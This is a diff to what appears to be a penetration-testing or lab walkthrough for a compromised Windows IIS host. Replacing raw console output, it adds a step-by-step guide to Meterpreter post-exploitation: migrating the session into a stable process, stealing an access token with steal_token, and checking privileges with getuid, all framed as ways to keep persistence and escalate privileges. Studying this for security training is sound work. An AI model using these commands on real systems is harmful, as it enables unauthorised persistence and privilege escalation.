@@ -107,16 +107,46 @@ Process List
  3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
  3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
  4076  1080  cidaemon.exe                                                    
-
-
-meterpreter > steal_token 1836
-
-Stolen token with username: NT AUTHORITY\NETWORK SERVICE
-
-
-meterpreter > getuid
-
-Server username: NT AUTHORITY\NETWORK SERVICE
 ```
-pgrep lsass
-migrate PID
+
+To migrate the Meterpreter session to another process, you can use the following steps:
+
+1. **Identify a Suitable Process:**
+   - Look for a stable process that is less likely to be terminated. System processes or services are often good candidates.
+
+2. **Migrate to the Process:**
+   - Use the `migrate` command followed by the Process ID (PID) of the target process.
+   ```shell
+   meterpreter > migrate <PID>
+   ```
+
+3. **Verify Migration:**
+   - After migration, you can verify the current user context with:
+   ```shell
+   meterpreter > getuid
+   ```
+
+4. **Steal a Token (Optional):**
+   - If you need to escalate privileges, you might attempt to steal a token from a process running under a higher privilege:
+   ```shell
+   meterpreter > steal_token <PID>
+   ```
+
+5. **Verify the New User Context:**
+   - Check the new user context after stealing a token:
+   ```shell
+   meterpreter > getuid
+   ```
+
+6. **Example of Token Stealing:**
+   ```shell
+   meterpreter > steal_token 1836
+
+   Stolen token with username: NT AUTHORITY\NETWORK SERVICE
+
+   meterpreter > getuid
+
+   Server username: NT AUTHORITY\NETWORK SERVICE
+   ```
+
+By migrating to a stable process and potentially stealing a token, you can maintain persistence and possibly escalate privileges within the target system. Always ensure you have the necessary permissions to perform these actions legally and ethically.
